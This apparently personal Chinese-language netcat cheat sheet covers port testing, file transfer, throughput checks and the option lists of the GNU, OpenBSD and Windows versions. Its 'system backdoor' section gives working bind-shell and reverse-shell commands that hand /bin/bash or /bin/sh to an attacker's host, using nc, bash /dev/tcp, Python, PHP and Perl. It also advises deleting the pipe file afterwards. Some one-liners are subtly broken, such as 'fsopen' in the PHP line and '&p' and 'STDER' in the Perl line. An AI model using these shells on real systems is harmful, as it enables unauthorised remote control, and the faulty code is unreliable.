# netcat快速使用  
> nc很强大，容易让人蹲号子
## 安装  
### Windows 
下载地址：https://eternallybored.org/misc/netcat/   
解压即用，可用在环境变量中添加文件夹位置以便在cmd中调用  
### Linux  
许多发行版Linux都预安装了netcat，使用```readlink -f $(which nc)```命令来检测预安装的版本  
+ ```/bin/nc.traditional```: 默认 GNU 基础版本，一般系统自带
+ ```/bin/nc.openbsd```: openbsd 版本，强大很多
  
此文基于OpenBsd版本  
安装：
+ ```apt-get install nc-traditional``` 
+ ```apt-get install nc-openbsd```  
切换版本：```sudo update-alternatives --config nc```  
### KALI
安装：```apt-get install netcat```
## 快速使用  
+ 端口测试  
测试主机（192.168.1.1）的8080端口是否打开：```nc -zv 192.168.1.1 8080```  
测试主机（192.168.1.1）一定范围内的端口开放情况：```nc -v -v -w3 -z 192.168.1.2 8080-8083```
    + -z：不发送数据
    + -v：显示更详细的信息，可使用多个v参数提高显示等级  
    + -w3：扫描超市时间为3秒  
+ 传输测试  
在两台主机之间使用netcat在特定端口传输数据测试端口连通性    
测试主机A(192.168.1.1)在8080的端口上打开监听：```nc -l -p 8080```  
测试主机B(192.168.1.2)连接到主机A的8080端口：```nc 192.168.1.1 8080```  
    + -l：监听模式
    + -p：设定用于连接的本地端口  
    + 使用ctrl+c结束会话
    + -k：服务端将在连接断开后持续工作（可选）  
+ 测试UDP会话  
测试主机A与主机B的UDP可到达情况  
测试主机A(192.168.1.1)在8080的端口上打开UDP监听：```nc -u -l -p 8080```  
测试主机B(192.168.1.2)连接到主机A的8080端口：```nc -u 192.168.1.1 8080```   
    + -u：UDP模式  
    + 使用ctrl+c结束会话
+ 文件传输  
从主机B向主机A上传输文件  
测试主机A(192.168.1.1)上监听端口8080：```nc -l -p 8080 > test.txt```  
测试主机B(192.168.1.2)上进行发送：```nc 192.168.1.1 8080 < test.txt```  
    + -N：stdin碰到EOF就关闭连接
    + 使用ctrl+c结束会话  
+ 网速吞吐量测试  
测试主机B与主机A之间的网速吞吐量  
A主机(192.168.1.1)打开8080端口准备接受文件，搭配pv命令监听：```nc -l -p 8080 | pv```  
B主机(192.168.1.2)进行文件传输：```nc 192.168.1.1 8080 < test.txt```  
    + pv：通过管道显示数据处理进度的信息
+ 抓取服务Banner  
```nc -nv 192.168.1.1 443```
+ 系统后门：  
    - 正向SHELL  
    GNU版本：  
    目标主机(192.168.1.1)：```nc -l -p 8080 -e /bin/bash```  
    入侵主机(192.168.1.2)：```nc 192.168.1.1 8080```  
    OpenBsd版本：  
    目标主机(192.168.1.1)：  
    ```mkfifo /tmp/f```  
    ```cat /tmp/f | /bin/bash 2>&1 | /bin/nc.openbsd -l -p 8080 > /tmp/f```  
    入侵主机(192.168.1.2)：```nc 192.168.1.1 8080```  
        + ctrl+c结束会话
        + 使用后需删除```/tmp/f```
        + 反向shell用于突破防火墙，进行端口转发  

    - 反向SHELL
    GNU版本：  
    目标主机(192.168.1.1)：```nc 192.168.1.2 8080 -e /bin/bash```  
    入侵主机(192.168.1.2)：```nc -l -p 8080```  
    OpenBsd版本：  
    目标主机(192.168.1.1)：  
    ```mkfifo /tmp/f```  
    ```cat /tmp/f | /bin/bash 2>&1 | /bin/nc.openbsd 192.168.1.2 8080 > /tmp/f```  
    入侵主机(192.168.1.2)：```nc -l -p  8080```  
        + ctrl+c结束会话
        + 使用后需删除```/tmp/f```
    当目标主机中没有nc时：
    1. python反向shell  
    目标主机：```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```  
    入侵主机(192.168.1.2)：```nc -v -l -p 1234```  
    2. Bash反向shell  
    目标主机：```bash -i >& /dev/tcp/192.168.1.2/1234 0>&1```  
    入侵主机(192.168.1.2)：```nc -v -l -p 1234```  
    3. PHP反向shell  
    目标主机：```php -r '$socke=fsopen("192.168.1.2",1234);exec("/bin/sh -i <&3 >&3");'```  
    入侵主机(192.168.1.2)：```nc -v -l -p 1234```  
    4. Perl反向shell  
    目标主机：```perl -e 'use Socket;$i="192.168.1.2";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(&p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDER,">&S");exec("/bin/sh -i");};'```  
    入侵主机(192.168.1.2)：```nc -v -l -p 1234```  
## 参数说明
### Linux OpenBSD版本：  
```
OpenBSD netcat (Debian patchlevel 1.217-3)  
usage: nc [-46CDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl]
          [-m minttl] [-O length] [-P proxy_username] [-p source_port]
          [-q seconds] [-s sourceaddr] [-T keyword] [-V rtable] [-W recvlimit]
          [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]
          [destination] [port]
        Command Summary:
                -4              使用 IPv4模式（默认）
                -6              使用 IPv6模式
                -b              允许广播
                -C              连接后发送此参数后shell命令
                -D              启用socket调试
                -d              分离stdin
                -F              保持socket fd
                -h              显示帮助
                -I length       设置TCP接收缓冲区长度
                -i interval     设置连接建立后每一行传送的数据或者多个端口扫描之间的时间间隔
                -k              为多个连接保持监听（在一个连接断开后仍进行监听）
                -l              开启监听模式，等待外部连接  
                -M ttl          设置传出TTL
                -m minttl       设置传入TTL
                -N              在stdin上读取到EOF后关闭连接  
                -n              禁止任何DNS解析  
                -O length       TCP发送缓冲区长度  
                -P proxyuser    设置代理服务器用户名  
                -p port         设置用于远程连接的本地端口
                -q secs         在stdin上读取到EOF后等待n秒后关闭连接
                -r              随机化远程端口
                -S              启用TCP MD5签名
                -s sourceaddr   本地源地址  
                -T keyword      设定TOS 值
                -t              Answer TELNET negotiation
                -U              使用UNIX域套接字
                -u              UDP 模式
                -V rtable       指定备用路由表
                -v              输出详细信息
                -W recvlimit    设定接受数据包上限
                -w timeout      设置建立连接的超时时间
                -X proto        设定代理协议: "4", "5" (SOCKS) 或 "connect"
                -x addr[:port]  设定代理地址和端口  
                -Z              DCCP 模式
                -z              Zero-I/O 模式 [仅扫描，不发送数据]
        Port numbers can be individual or ranges: lo-hi [inclusive]

```
### Linux Traditional版本：  
```
[v1.10-46]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       类似于 `-e'参数; 使用 /bin/sh 执行命令 [危险参数!!]
        -e filename             连接后执行程序 [危险参数!!]
        -b                      允许广播
        -g gateway              设置路由器跃程网关，最多可设置8个
        -G num                  设置源路由指向器的数量，值为4的倍数  
        -h                      显示帮助  
        -i secs                 设定数据包发送/扫描间隔
        -k                      保持连接打开
        -l                      开启监听模式，等待外部连接
        -n                      不进行DNS查询  
        -o file                 将流量存储到十六进制文件
        -p port                 设置本地监听端口
        -r                      随机本地端口和远程端口  
        -q secs                 在stdin上读取到EOF后等待n秒后关闭连接
        -s addr                 本地源地址
        -T tos                  设置服务类型 
        -t                      answer TELNET negotiation
        -u                      UDP 模式
        -v                      输出详细信息
        -w secs                 设置建立连接的超时时间
        -C                      连接后发送此参数后shell命令
        -z                      Zero-I/O 模式 [仅扫描，不发送数据]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
```
### Windows版本：
```
[v1.12 NT http://eternallybored.org/misc/netcat/]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [options] [hostname] [port]
options:
        -d              后台模式  
        -e prog         连接后执行程序 [危险参数!!]
        -g gateway      设置路由器跃程网关，最多可设置8个
        -G num          设置源路由指向器的数量，值为4的倍数  
        -h              显示帮助 
        -i secs         设定数据包发送/扫描间隔
        -l              开启监听模式，等待外部连接
        -L              listen harder, re-listen on socket close
        -n              不进行DNS查询  
        -o file         将流量存储到十六进制文件
        -p port         本地监听端口  
        -r              随机化本地与远程端口
        -s addr         本地源地址  
        -t              answer TELNET negotiation
        -c              连接后发送此参数后shell命令
        -u              UDP 模式
        -v              输出详细信息
        -w secs         设置建立连接的超时时间
        -z              Zero-I/O 模式 [仅扫描，不发送数据]
port numbers can be individual or ranges: m-n [inclusive]
```
## 参考链接
+ 用好你的瑞士军刀/netcat：https://zhuanlan.zhihu.com/p/83959309
+ 将netcat-openbsd替换成为netcat-traditional https://blog.csdn.net/bitcarmanlee/article/details/72197142  
+ nc很强大，容易让人蹲号子：https://zhuanlan.zhihu.com/p/199079668
